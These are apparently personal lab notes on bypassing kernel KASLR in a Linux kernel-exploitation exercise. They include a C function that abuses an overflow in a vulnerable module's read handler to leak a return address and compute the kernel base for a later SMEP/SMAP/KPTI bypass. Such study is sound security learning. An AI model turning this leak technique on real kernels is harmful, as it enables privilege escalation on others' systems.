some prerequisites...

### About KASLR

`kaslr` is similar to `aslr` in userland. 

The kernel reserves 1 GB of address space from `0xffffffff80000000` to `0xffffffffc0000000`. Therefore, even if `KASLR` is enabled, only `0x3f0` or so base addresses will be generated from `0x810` to `0xc00`.

![](pics/img00.png)

To deal with `KASLR`, we have to leak any kernel address, then calculate offset and padding them to exploit like before.

**Attention**

When debugging, navigate symbols from kernel like this:

```bash
cat /proc/kallsyms | grep startup_64
```

only can view with `id = 0` (root)

### KASLR affect to gadgets?

i met the same issues with this guy...

read the bypass kaslr part, about gadget finding errors: https://blog.wohin.me/posts/pawnyable-0201/

> retry other gadgets until success i guess...

### KASLR: +smep, +smap, kpti=on, kaslr

**Summary**:

The overflow bug also in `module_read` function. So we can use that to leak the kernel address that available after the saved `RIP`, similar to this:

```C
void leak_kernel_addr()
{
    u64 buf[200];
    u64 rip_offset = 0x408;

    u64 len = rip_offset + 8;
    read(dev_fd, (char *)&buf, len);

    u64 leak_addr = buf[0x408/8];
    kernel_base = leak_addr - 0x13d33c; // 0xffffffff8113d33c - 0xffffffff81000000
    printf("[?] kernel_base: 0x%lx\n", kernel_base);
    ...
```

- leak kernel base then perform exploit like previous `kpti` bypass
- remember to add offset to corresponding gadgets...

> exploit in the same folder